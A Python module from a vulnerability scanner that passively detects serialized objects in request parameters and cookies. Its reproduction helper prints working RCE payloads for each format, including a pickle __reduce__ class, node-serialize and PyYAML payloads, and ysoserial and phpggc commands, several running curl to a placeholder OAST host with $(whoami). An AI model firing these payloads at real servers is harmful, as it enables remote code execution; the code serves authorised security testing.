"""Insecure Deserialization detection module.

Serialized objects flowing through a request (parameters, cookies, hidden
fields, headers) are a top RCE vector: if the server deserialises attacker-
controlled bytes with a vulnerable library, gadget chains (ysoserial,
phpggc, pickle __reduce__) turn it into code execution.

Detection here is signature-based and passive — it recognises the wire format
of serialized blobs without sending exploit payloads (sending a real gadget
would be both destructive and, against third parties, illegal). Each hit comes
with the exact tool + command to confirm exploitability in an authorised lab.

Recognised formats:
  - Java serialization      (raw 0xACED magic, or base64 'rO0' / hex 'aced')
  - PHP serialize()         (O:<n>:"…" objects, a:<n>:{…} arrays)
  - Python pickle           (raw 0x80 proto, base64 'gAS'/'gAJ'/'gAR', opcodes)
  - .NET ViewState / BinaryFormatter (__VIEWSTATE, base64 'AAEAAAD')
  - Ruby Marshal            (raw 0x0408, base64 'BAh')
  - Node node-serialize     ('_$$ND_FUNC$$_')
  - YAML (PyYAML) tags      ('!!python/object', '!ruby/object')
"""

import base64
import binascii
import logging
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import unquote, urlparse

from .base import BaseModule, Finding

logger = logging.getLogger("vulnscanner")


# (tech, confidence, gadget-tool, how-to) for each detected format.
_GADGET_TOOL = {
    "Java":   "ysoserial",
    "PHP":    "phpggc",
    "Python pickle": "a malicious __reduce__ pickle",
    ".NET":   "ysoserial.net",
    "Ruby Marshal": "a Ruby Marshal gadget (universal RCE gadget)",
    "Node":   "a node-serialize IIFE payload",
    "YAML":   "a PyYAML !!python/object/apply payload",
}


def _b64_decodes_to(value: str, magic: bytes) -> bool:
    """True if *value* is base64 that decodes to bytes starting with *magic*."""
    s = value.strip()
    if len(s) < 8:
        return False
    # url-safe and standard, tolerate missing padding
    s2 = s.replace("-", "+").replace("_", "/")
    s2 += "=" * (-len(s2) % 4)
    try:
        raw = base64.b64decode(s2, validate=False)
    except (binascii.Error, ValueError):
        return False
    return raw.startswith(magic)


def detect_serialized(value: str) -> Optional[Tuple[str, str, str]]:
    """Identify the serialization format of *value*.

    Returns ``(tech, confidence, evidence)`` or ``None``. Pure function — the
    testable core of this module.
    """
    if not value:
        return None
    v = unquote(value).strip()

    # --- Raw binary magic bytes (when sent unencoded) ---
    raw_bytes = v.encode("latin-1", "replace")
    if raw_bytes[:2] == b"\xac\xed":
        return ("Java", "high", "raw Java serialization magic 0xACED")
    if raw_bytes[:2] == b"\x04\x08":
        return ("Ruby Marshal", "high", "raw Ruby Marshal magic 0x0408")
    if raw_bytes[:1] == b"\x80" and len(raw_bytes) > 2 and raw_bytes[1] in (2, 3, 4, 5):
        return ("Python pickle", "high", f"raw pickle protocol {raw_bytes[1]} magic 0x80")

    # --- Base64-wrapped magic ---
    if v.startswith("rO0"):  # base64 of 0xACED0005
        return ("Java", "high", "base64 Java serialization stream ('rO0AB…')")
    if _b64_decodes_to(v, b"\xac\xed"):
        return ("Java", "high", "base64 decodes to Java magic 0xACED")
    if v[:8].lower().startswith("aced0005"):
        return ("Java", "high", "hex-encoded Java serialization stream")
    if v.startswith(("gAS", "gAJ", "gAR", "gAT", "gAQ")):  # base64 of 0x80 0x04/0x03…
        return ("Python pickle", "high", "base64 pickle stream ('gAS…')")
    if _b64_decodes_to(v, b"\x80"):
        return ("Python pickle", "medium", "base64 decodes to a pickle-proto byte")
    if v.startswith("BAh"):  # base64 of 0x0408
        return ("Ruby Marshal", "high", "base64 Ruby Marshal stream ('BAh…')")
    if v.startswith("AAEAAAD"):  # .NET BinaryFormatter base64
        return (".NET", "high", ".NET BinaryFormatter base64 stream ('AAEAAAD…')")

    # --- Textual formats ---
    if re.match(r'^O:\d+:"', v) or re.match(r"^a:\d+:\{", v):
        return ("PHP", "high", "PHP serialize() object/array literal")
    if "_$$ND_FUNC$$_" in v:
        return ("Node", "high", "node-serialize function marker '_$$ND_FUNC$$_'")
    if "!!python/object" in v or "!!python/" in v:
        return ("YAML", "high", "PyYAML !!python/object tag (unsafe load)")
    if "!ruby/object" in v:
        return ("YAML", "medium", "Ruby YAML object tag")

    return None


def _viewstate_unprotected(value: str) -> bool:
    """ASP.NET __VIEWSTATE without a MAC is deserialised unauthenticated.

    Heuristic: a base64 ViewState that decodes and starts with the
    BinaryFormatter/LosFormatter markers. Real MAC validation can't be checked
    blind, so this is reported at medium confidence."""
    return _b64_decodes_to(value, b"\xff\x01") or value.startswith("/wE")


class DeserializationScanner(BaseModule):
    """Flags serialized objects in inputs that may reach an unsafe deserializer."""

    NAME = "deserial"

    def __init__(self, http_client, config: Dict) -> None:
        super().__init__(http_client, config)
        self._checked_cookies: set = set()

    def scan_parameter(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> List[Finding]:
        findings: List[Finding] = []

        # 1. The parameter value itself.
        value = params.get(param_name, "")
        hit = detect_serialized(value)
        if hit:
            findings.append(self._make_finding(url, method, param_name, value, *hit))
        elif param_name.upper() == "__VIEWSTATE" and _viewstate_unprotected(value):
            findings.append(self._make_finding(
                url, method, param_name, value,
                ".NET", "medium", "ASP.NET __VIEWSTATE (verify MAC is disabled)",
            ))

        # 2. Cookies (once per host) — session blobs are a classic deser sink.
        host = urlparse(url).hostname or ""
        if host not in self._checked_cookies:
            self._checked_cookies.add(host)
            for ck_name, ck_val in (self.config.get("cookies") or {}).items():
                ck_hit = detect_serialized(ck_val)
                if ck_hit:
                    findings.append(self._make_finding(
                        url, method, f"cookie:{ck_name}", ck_val, *ck_hit,
                    ))

        return findings

    def _make_finding(
        self, url, method, parameter, value, tech, confidence, evidence,
    ) -> Finding:
        tool = _GADGET_TOOL.get(tech, "the matching gadget tool")
        preview = (value[:48] + "…") if len(value) > 48 else value
        repro = self._repro(tech, url, parameter, tool)
        return Finding(
            vuln_type=f"Insecure Deserialization ({tech})",
            url=url,
            method=method,
            parameter=parameter,
            payload=preview,
            evidence=f"{evidence}. Value: {preview!r}",
            confidence=confidence,
            details=(
                f"The {parameter!r} input carries a {tech} serialized object. If the "
                f"server deserialises it with a vulnerable configuration, a crafted "
                f"gadget chain ({tool}) yields remote code execution. This finding "
                f"identifies the FORMAT and sink — confirm exploitability in an "
                f"authorised lab before reporting. Remediation: never deserialise "
                f"untrusted data; use signed/whitelisted formats (JSON) and integrity "
                f"checks (HMAC) on any opaque token."
            ),
            reproduction=repro,
        )

    @staticmethod
    def _repro(tech: str, url: str, parameter: str, tool: str) -> str:
        if tech == "Java":
            return (
                "# 1. Identify the gadget (check classpath libs: CommonsCollections, etc.):\n"
                "$ java -jar ysoserial.jar CommonsCollections5 'curl http://OAST/$(whoami)' | base64 -w0\n"
                f"# 2. Replace the {parameter!r} value with the base64 above and resend.\n"
                "# 3. Watch your OAST/Collaborator for the callback (blind RCE proof).\n"
                "# 4. Detect gadgets safely first with the GadgetProbe / Java Deserialization Scanner (Burp)."
            )
        if tech == "PHP":
            return (
                "# 1. Build a gadget chain for the target framework (Laravel/Symfony/WP):\n"
                "$ phpggc -l                 # list available chains\n"
                "$ phpggc Laravel/RCE1 system 'id'\n"
                f"# 2. URL-encode and put it in {parameter!r}; resend.\n"
                "# 3. Look for command output / OAST callback."
            )
        if tech == "Python pickle":
            return (
                "# Pickle deserialization = trivial RCE via __reduce__:\n"
                "$ python3 -c \"import pickle,base64,os\n"
                "class E:\n"
                "    def __reduce__(self): return (os.system,('curl http://OAST/$(whoami)',))\n"
                f"print(base64.b64encode(pickle.dumps(E())).decode())\"\n"
                f"# Put the output in {parameter!r} and resend; watch OAST."
            )
        if tech == ".NET":
            return (
                "# 1. Generate a .NET gadget:\n"
                "$ ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'ping OAST' -o base64\n"
                f"# 2. Replace {parameter!r} (e.g. __VIEWSTATE) and resend.\n"
                "# 3. For ViewState specifically, try the Blacklist3r / viewgen toolchain."
            )
        if tech == "Ruby Marshal":
            return (
                "# Ruby Marshal has a universal RCE gadget:\n"
                "# Use the Universal Deserialisation Gadget (Luke Jahnke) for the Ruby version.\n"
                f"# Base64-encode it into {parameter!r} and resend; watch OAST."
            )
        if tech == "Node":
            return (
                "# node-serialize executes IIFE on unserialize():\n"
                "# {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process')"
                ".exec('curl http://OAST/$(whoami)')}()\"}\n"
                f"# Place in {parameter!r}; watch OAST."
            )
        return (
            "# PyYAML unsafe load → RCE:\n"
            "# !!python/object/apply:os.system ['curl http://OAST/$(whoami)']\n"
            f"# Place in {parameter!r}; watch OAST."
        )
